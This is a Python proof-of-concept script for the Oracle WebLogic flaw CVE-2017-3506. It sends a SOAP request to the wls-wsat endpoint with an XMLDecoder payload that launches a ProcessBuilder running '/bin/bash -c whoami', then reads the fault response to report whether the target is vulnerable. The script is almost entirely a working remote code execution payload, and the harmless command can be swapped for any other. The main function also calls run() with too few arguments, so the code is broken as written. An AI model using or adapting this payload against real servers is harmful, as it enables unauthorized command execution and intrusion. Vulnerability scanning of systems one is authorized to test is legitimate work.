#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
'''
 ____       _     _     _ _   __  __           _    
|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   < 
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\

'''
import sys
import requests
import re
import logging
h=''

logging.basicConfig(filename='Weblogic.log',
                    format='%(asctime)s %(message)s',
                    filemode="w", level=logging.INFO)

VUL=['CVE-2017-3506']
headers = {'user-agent': 'ceshi/0.0.1'}

def poc(url,index):
    if not url.startswith("http"):
        url = h + url
    if "/" in url:
        url += '/wls-wsat/CoordinatorPortType'
    post_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
				<void index="2">
                  <string>whoami</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    try:
        response = requests.post(url, data=post_str, verify=False, timeout=5, headers=headers)
        response = response.text
        response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
    except Exception:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        logging.info('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
        print('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
    else:
        logging.info('[-]Target weblogic not detected {}'.format(VUL[index]))
        print('[-]Target weblogic not detected {}'.format(VUL[index]))


def run(rip,rport,index,hh):
    h=hh
    url=rip+':'+str(rport)
    poc(url=url,index=index)

if __name__ == '__main__':
    dip = sys.argv[1]
    dport = int(sys.argv[2])
    run(dip,dport,0)